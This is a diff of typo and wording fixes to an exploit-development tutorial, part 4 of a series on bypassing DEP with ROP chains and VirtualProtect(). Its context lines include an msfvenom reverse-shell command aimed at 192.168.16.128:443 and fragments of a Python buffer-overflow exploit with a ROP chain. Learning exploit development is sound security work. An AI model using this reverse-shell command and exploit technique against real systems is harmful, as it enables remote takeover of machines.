@@ -21,9 +21,9 @@ Data Execution Prevention (DEP) is a memory protection mechanism that prevents c
 
 ## Return Oriented Programming (ROP)
 
-Since we can't just drop shellcode on the stack like we usually do for a classic buffer overflow without any memory protection, we need to use something called Return Oriented programming. 
+Since we can't just drop shellcode on the stack like we usually do for a classic buffer overflow without any memory protection, we need to use something called Return Oriented Programming. 
 
-Return Oriented Programming is a technique used in exploit development to counter-memory protections such as Data Execution Prevention (DEP) by using chaining together existing sequence of instructions or snippets of code within the program called gadgets, usually followed by a `RETN`. The `RETN` instruction will POP the return address from the stack back into the EIP register and redirect execution flow. We can use these instructions to return to another region in memory, rather than the intended area in memory, to execute a function or code of our choice, that makes the stack executable (`VirtualProtect()`).
+Return Oriented Programming is a technique used in exploit development to counter-memory protections such as Data Execution Prevention (DEP) by chaining together existing sequence of instructions or snippets of code within the program called gadgets, usually followed by a `RETN`. The `RETN` instruction will POP the return address from the stack back into the EIP register and redirect execution flow. We can use these instructions to return to another region in memory, rather than the intended area in memory, to execute a function or code of our choice, that makes the stack executable (`VirtualProtect()`).
 
 When a function is called the caller places the arguments of the function on the stack then places the returns address on the stack (the next instruction to be executed right after the function is called). When a function has finished performing the intended tasks, it will call the `RET` instruction, which POPs the return address back into the EIP register to resume execution flow. We can hijack the execution flow to return to an existing function. In Linux, this function could be `system()` with the arguments `/bin/sh` (`ret2system`), which pops a shell or `mprotect()` `(ret2mprotect)`, which makes the stack executable. However, in Windows we have functions such as `VirtulAlloc(), HeapCreate(), SetProcessDEPPolicy(), NtSetInformationProcess(), VirtualProtect(), or WriteProtectMemory()` etc...
 
@@ -268,7 +268,7 @@ We can use existing Windows API functions to turn off DEP, or to allocate a regi
 
 We will be using VirtualProtect().
 
-The process chaining together these gadgets (machine language code) can still be very complicated. But, thanks to the authors of MONA, it makes it easier.
+The process of chaining together these gadgets (machine language code) can still be very complicated. But, thanks to the authors of Mona, it makes this a lot easier.
 
 
 
@@ -446,13 +446,13 @@ except:
 
 After modifying and sending the exploit, we hit our breakpoint after a series of \x90's (NOPs), which means it worked :) We execute the breakpoint that was placed on the stack. We made the stack executable!
 
-You can place anything after the ROP chain, such as `\xcc`, which is a breakpoint or `\x90's` or even your shellc
+You can place anything after the ROP chain, such as `\xcc`, which is a breakpoint or `\x90's` or even your shellcode.
 
 
 
 ![StackExecutable.png](/images/2020-10-12-Stack-Based-Buffer-Overflows-DEP-Part-4/ad2bd7af55e746938d2cc7078f457fef.png)
 
-To geenerate a reverse shell, you can use the following:
+To generate a reverse shell, you can use the following:
 
 `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.16.128 LPORT=443 EXITFUNC=thread -b '\x00' -f c`
 
@@ -549,7 +549,7 @@ def create_rop_chain():
 rop_chain = create_rop_chain()
 
 
-#JMP ESP 0x625011AF: \xAF\x11\x50\x62 (not required anymore, but you can use it if you want)
+#JMP ESP 0x625011AF: \xAF\x11\x50\x62 (not required anymore)
 memn0ps = "\x90"
 
 payload = "A" * 2003
@@ -574,7 +574,7 @@ except:
 
 
 
-W00TW00T we have a reverse shell. DEP was successfully bypassed
+W00TW00T we have a reverse shell. DEP was successfully bypassed! :D
 
 ![WOOTWOOT.png](/images/2020-10-12-Stack-Based-Buffer-Overflows-DEP-Part-4/e344346141f940aa99c9fb4dec5ad6c8.png)
 
